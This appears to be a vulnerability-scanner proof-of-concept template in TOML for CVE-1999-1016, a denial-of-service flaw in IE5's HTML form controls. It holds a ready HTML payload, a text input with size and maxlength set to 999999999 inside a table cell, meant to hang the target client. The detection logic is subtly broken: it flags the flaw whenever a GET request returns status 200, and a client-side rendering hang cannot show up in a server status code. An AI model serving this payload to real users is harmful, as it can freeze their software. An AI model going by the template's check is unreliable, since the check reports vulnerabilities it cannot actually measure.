[info]
author = "ave"
description = "验证目标 IE5/FrontPage Express/Outlook Express 5 等使用 MS HTML 控件的客户端是否受 CVE-1999-1016 拒绝服务漏洞影响。构造包含超大 HTML 表单字段（如表格单元格中超大尺寸 text 输入框）的恶意 HTML 页面，若目标解析渲染时 CPU 飙升至 100% 或进程挂起，则判定存在漏洞。本 PoC 以安全无损方式渲染页面以触发异常占用，不造成持久破坏。"
id = "POC-AVE-1999-0866"
name = "CVE-1999-1016 Internet Explorer 5 HTML Form Control DoS PoC"
severity = "medium"
tags = ["ave-1999-0866"]
vuln_id = [
    "CVE-1999-1016",
    "AVE-1999-0866",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cve-1999-1016-poc.html"
protocol = "http"

[poc.requests.body]
content = '<!DOCTYPE html><html><head><title>CVE-1999-1016 PoC</title></head><body><table><tr><td><input type="text" size="999999999" maxlength="999999999" value="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"></td></tr></table></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
